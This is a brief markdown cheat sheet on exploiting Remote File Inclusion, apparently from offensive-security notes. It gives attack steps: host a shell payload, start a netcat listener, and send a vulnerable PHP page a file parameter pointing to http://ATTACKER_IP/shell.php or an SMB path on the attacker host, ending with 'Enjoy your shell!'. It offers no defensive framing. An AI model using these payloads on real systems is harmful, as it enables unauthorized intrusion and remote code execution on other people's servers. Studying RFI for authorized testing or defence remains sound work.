# Remote File Inclusion (RFI)

### Allows an attacker to inject external URL in a vulnerable backend PHP/Python/etc. function.

### Example: 

#### 1: Host payload in an http server then setup a listener.

#### 2: 

    http://site.com/index.php?file=http://ATTACKER_IP/shell.php

#### 3: Enjoy your shell!

### TIP: If you detect an LFI vulnerability on a windows host, try to check if you can send files over SMB to the server like:

#### 1) 

    nc -lvnp PORT (Setup listener)

#### 2) 

    http://site.com/index.php?file=\\ATTACKER_IP\\FILE.php
